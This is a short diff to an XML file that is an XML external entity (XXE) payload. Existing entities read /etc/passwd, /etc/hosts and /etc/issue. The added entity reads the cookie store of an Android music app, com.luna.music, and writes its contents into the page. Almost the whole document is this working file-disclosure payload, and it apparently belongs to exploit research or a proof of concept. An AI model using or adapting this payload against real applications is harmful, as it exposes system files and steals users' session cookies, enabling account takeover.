@@ -3,6 +3,7 @@
 <!ENTITY passwd SYSTEM "file:///etc/passwd">
 <!ENTITY hosts SYSTEM "file:///etc/hosts">
 <!ENTITY issue SYSTEM "file:///etc/issue">
+<!ENTITY cookie SYSTEM "file:///data/data/com.luna.music/shared_prefs/cookieStore.xml">
 ]> 
 <p>
 <p>/etc/passwd: 
@@ -13,5 +14,8 @@
 </p>
 <p>/etc/issue:
     &issue;
+</p>
+<p>/cookie:
+    &cookie;
 </p>
 </p>
